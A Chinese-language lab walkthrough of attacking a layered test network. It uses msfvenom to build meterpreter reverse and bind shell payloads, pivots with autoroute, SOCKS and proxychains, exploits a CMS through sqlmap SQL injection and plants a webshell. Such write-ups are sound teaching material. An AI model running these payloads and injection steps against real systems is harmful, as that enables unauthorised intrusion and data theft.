### 对外网Centos 服务器进行渗透

*   首先使用nmap对外网服务器进行扫描
    

```
nmap -A 192.168.91.138
```

![](../Images/b7f23185bb16d168707c85722a942bac.png)

*   通过扫描发现外网机器拥有这些端口，对这些端口进行一个分析，发现拥有21,80,3306,8888
    
*   可以推断出是一个Linux主机，并且是使用的宝塔搭建的服务器

#### 使用msf对外网centos主机进行渗透

*   这边使用msf生成一个Linux的木马，执行木马反弹shell
    

```
msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=192.168.91.129 LPORT=6666 -f elf 		>/home/kali/桌面/linux1.elf
```

![](../Images/bde4fed2a39536f2db84a89a0d5371e3.png)

*   上传到centos主机
    

![](../Images/d3b02a3ce50d166603747bf4422ce250.png)

*   打开msf，监听木马
    

```


use exploit/multi/handler //使用监听器
```

![](../Images/f4915d55626e1a9dfd6765435f0407d6.png)

*   赋予权限，执行木马
    

```

chmod 777 linux1.elf
```

*   成功反弹回来shell
    

![](../Images/7d69d871c813672f80dfc5b02dd6d1d2.png)

  

*   查看内网网络情况
    

![](../Images/7e89a9694e71047782adbc515d1a67b8.png)

*   这里发现有三个网段，其中一个192.168.122。0 是因为在虚拟机，有一张虚拟网卡，所有这个忽略掉
    
*   添加路由
    

```
run autoroute -s 192.168.22.0/24
```

![](../Images/30bad891b60430c5f8bf4217f3258ada.png)

*   查看路由
    

```
run autoroute -p
```

![](../Images/92c98bba575466ca3869e72f6afa7835.png)

*   发现已经添加进去了

#### 使用代理，对内网进行更深层次的渗透操作

*   首先挂起这个会话
    

```
background
```

![](../Images/87c641bb5d9f62ef2c9f2205509c24b4.png)

*   这里使用msf的代理模块，进行一个代理
    

```
search socks //查找socks代理模块
```

![](../Images/4137b004219600d22e0c7788b4f598b4.png)

*   使用第一个就行
    

```
use 0
```

![](../Images/482b0953444366e27ce6baa6144eb50a.png)

*   使用 options 查看要配置哪些参数
    

![](../Images/dd4b67a9d10e0b3946b5f05ca1b4a944.png)

*   我们这里使用socks4 ,并且设置监听为本机地址,0.0.0.0 是代表所有地址
    

```


set version 4a //这是使用sock4a 进行一个代理
```

![](../Images/e894f63c3d7e85ab344e054468a5e050.png)

*   执行命令之后，还需要修改一个地方，才能在kali中直接代理到centos主机
    

```
vim /etc/proxychains4.conf
```

*   将最下面的IP地址和端口改成msf中设置代理的ip和端口
    

![](../Images/0ae6d440a49161469d619a0845c83dce.png)

*   当然如果你要使用socks5 直接将4 改成5 就可以，或者可以再添加一条代理规则

### 对第二层Ubunto主机进行渗透

#### 对第二层主机(22网段)进行扫描

![](../Images/0b1de33993e8e9f4cc6a3e4fc100b36a.png)

*   要扫描22网段的主机，需要再nmap前面加上proxychains ,使用其它工具也是一样的道理
    
*   这里由于是扫描整个网段的主机的80端口，所有可能有点慢
    
*   正常来讲不能直接扫描80端口，由于这里是上帝模式，所以简单的略过了
    

![](../Images/73a51c3cdcc610cdc517bbedb0a0f615.png)

*   这里发现128，129 两台主机
    

*   129 是我们的centos主机，所以128就是我们第二层渗透需要攻击的主机
    

*   我们再windows 上设置一个代理，让我们的Windows主机也能够访问22网段的主机，方便我们对80端口进行一个渗透
    

![](../Images/a7a2aa0eadc6ef634cafbcad59f44750.png)

*   这里使用的是SocksCap64 ，再代理配置里面添加代理，地址写刚才配置kali的代理配置文件的那个地址就行，端口也是一样的
    
*   测试连接
    

![](../Images/9f3798b679f74950c98ef337bb45be0a.png)

*   可以成功连接
    

#### 对22网段128主机的80端口进行渗透

*   访问80端口，我们发现是一个80端口
    

![](../Images/0a779d75f309c3280a7f3713593053f2.png)

*   用的cms是八哥cms，按照一贯思维，会先尝试试试有没有什么敏感文件，敏感目录，或者爆出什么nday![](../Images/c682c57eb83463898162c5c7d3d2107c.png)
    

*   发现了后台
    

![](../Images/52ebfd94bce289680f8687e67ece6d3e.png)

*   这里是一个可以爆破的点
    
*   这里查看他的历史漏洞，发现了一个SQL注入，所以就不采用其它方式了
    

*   这里直接使用nday打
    

```
http://192.168.22.128/index.php?r=vul&keyword=1'
```

![](../Images/f2b1cdb4f458636a6cf5a0288202360d.png)

*   直接上SQLMAP跑
    

```
proxychains sqlmap -u "http://192.168.22.128/index.php?r=vul&keyword=1" --delay 0.5 --batch
```

![](../Images/06c8218f66091f1ba3a4d434fb0dd8b1.png)

*   sqlmap 上个延时，不然 代理很容易跑崩了
    

```


proxychains sqlmap -u "http://192.168.22.128/index.php?r=vul&keyword=1" --delay 0.5 --batch --tables
```

![](../Images/79d802909f345cf03b9a8aef002d729d.png)

*   到此，flag,username,password 全部拿到，第一个flag在蚁剑中可以看到
    

*   admin,123qwe
    

![](../Images/21a427863ec7236b67e4924ad07061f1.png)

*   成功登陆
    
*   接下来要拿到Ubunto目标主机的webshell
    

![](../Images/e7b7006355f16ce5beed0b7cefa023ae.png)

*   在模板这边写入webshell
    

![](../Images/69771ebd633ce165e862e804f493fe45.png)

*   成功连接，发现flag文件
    
*   再生成一个马，并且再ubunto主机上执行
    

*   这里需要生成正向连接的马，原因是因为我们开始的91网段只有一个22网段的路由，没有33网段的路由，所以并不能连接到33网段的路由，记住此时我们已经拿到ubunto主机的web服务器，我们要将这个后门放到他的服务器上，执行这个后门来连接我们的msf，之后msf会反弹回ubunto主机的权限，接下来就可以顺理成章的添加33网段路由
    

```
msfvenom -p linux/x64/meterpreter/bind\_tcp LPORT=10000 -f elf > /home/kali/桌面/linux2.elf
```

*   再kali上设置监听
    

```


set payload linux/x64/meterpreter/bind\_tcp
```

![](../Images/0e27c21530b386c3aac4d509ee742d5f.png)

*   成功反弹会话
